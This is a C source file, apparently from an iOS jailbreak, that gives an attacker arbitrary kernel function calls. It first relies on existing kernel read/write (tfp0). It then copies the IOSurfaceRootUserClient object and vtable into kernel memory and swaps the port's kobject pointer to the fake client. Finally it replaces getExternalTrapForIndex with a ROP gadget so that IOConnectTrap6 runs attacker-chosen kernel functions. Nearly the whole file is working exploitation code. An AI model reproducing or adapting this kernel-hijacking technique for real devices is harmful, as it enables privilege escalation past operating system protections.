#include "KernelExecution.h"
#include "KernelMemory.h"
#include "KernelOffsets.h"
#include "KernelUtilities.h"
#include "find_port.h"
#include "kernel_call.h"
#include <common.h>
#include <iokit.h>
#include <pthread.h>
#import <patchfinder64.h>
#include "parameters.h"
#include "kc_parameters.h"
#include "kernel_memory.h"

#if !__arm64e__
static mach_port_t prepare_user_client()
{
    kern_return_t err;
    mach_port_t user_client;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));

    if (service == IO_OBJECT_NULL) {
        LOG("unable to find service");
        exit(EXIT_FAILURE);
    }

    err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
    if (err != KERN_SUCCESS) {
        LOG("unable to get user client connection");
        exit(EXIT_FAILURE);
    }

    return user_client;
}

static mach_port_t user_client;
static kptr_t IOSurfaceRootUserClient_port;
static kptr_t IOSurfaceRootUserClient_addr;
static kptr_t fake_vtable;
static kptr_t fake_client;
static const int fake_kalloc_size = 0x1000;
#endif
static pthread_mutex_t kexec_lock;

bool init_kexec()
{
#if __arm64e__
    if (!parameters_init()) return false;
    kernel_task_port = tfp0;
    if (!MACH_PORT_VALID(kernel_task_port)) return false;
    current_task = ReadKernel64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    if (!KERN_POINTER_VALID(current_task)) return false;
    kernel_task = ReadKernel64(getoffset(kernel_task));
    if (!KERN_POINTER_VALID(kernel_task)) return false;
    if (!kernel_call_init()) return false;
#else
    user_client = prepare_user_client();
    if (!MACH_PORT_VALID(user_client)) return false;

    // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
    IOSurfaceRootUserClient_port = get_address_of_port(proc_struct_addr(), user_client); // UserClients are just mach_ports, so we find its address
    if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_port)) return false;

    IOSurfaceRootUserClient_addr = ReadKernel64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); // The UserClient itself (the C++ object) is at the kobject field
    if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_addr)) return false;

    kptr_t IOSurfaceRootUserClient_vtab = ReadKernel64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
    if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_vtab)) return false;

    // The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
    // Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel

    // Create the vtable in the kernel memory, then copy the existing vtable into there
    fake_vtable = kmem_alloc(fake_kalloc_size);
    if (!KERN_POINTER_VALID(fake_vtable)) return false;

    for (int i = 0; i < 0x200; i++) {
        WriteKernel64(fake_vtable + i * 8, ReadKernel64(IOSurfaceRootUserClient_vtab + i * 8));
    }

    // Create the fake user client
    fake_client = kmem_alloc(fake_kalloc_size);
    if (!KERN_POINTER_VALID(fake_client)) return false;

    for (int i = 0; i < 0x200; i++) {
        WriteKernel64(fake_client + i * 8, ReadKernel64(IOSurfaceRootUserClient_addr + i * 8));
    }

    // Write our fake vtable into the fake user client
    WriteKernel64(fake_client, fake_vtable);

    // Replace the user client with ours
    WriteKernel64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);

    // Now the userclient port we have will look into our fake user client rather than the old one

    // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
    WriteKernel64(fake_vtable + 8 * 0xB7, getoffset(add_x0_x0_0x40_ret));

#endif
    pthread_mutex_init(&kexec_lock, NULL);
    return true;
}

void term_kexec()
{
#if __arm64e__
    kernel_call_deinit();
#else
    WriteKernel64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
    kmem_free(fake_vtable, fake_kalloc_size);
    kmem_free(fake_client, fake_kalloc_size);
    IOServiceClose(user_client);
#endif
    pthread_mutex_destroy(&kexec_lock);
}

kptr_t kexec(kptr_t ptr, kptr_t x0, kptr_t x1, kptr_t x2, kptr_t x3, kptr_t x4, kptr_t x5, kptr_t x6)
{
    kptr_t returnval = 0;
    pthread_mutex_lock(&kexec_lock);
#if __arm64e__
    returnval = kernel_call_7(ptr, 7, x0, x1, x2, x3, x4, x5, x6);
#else
    // When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
    // to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
    // This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the
    // function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed
    // through like normal.

    // Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it
    // We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
    // (i'm not actually sure if the switch back is necessary but meh)

    kptr_t offx20 = ReadKernel64(fake_client + 0x40);
    kptr_t offx28 = ReadKernel64(fake_client + 0x48);
    WriteKernel64(fake_client + 0x40, x0);
    WriteKernel64(fake_client + 0x48, ptr);
    returnval = IOConnectTrap6(user_client, 0, x1, x2, x3, x4, x5, x6);
    WriteKernel64(fake_client + 0x40, offx20);
    WriteKernel64(fake_client + 0x48, offx28);
#endif
    pthread_mutex_unlock(&kexec_lock);
    return returnval;
}
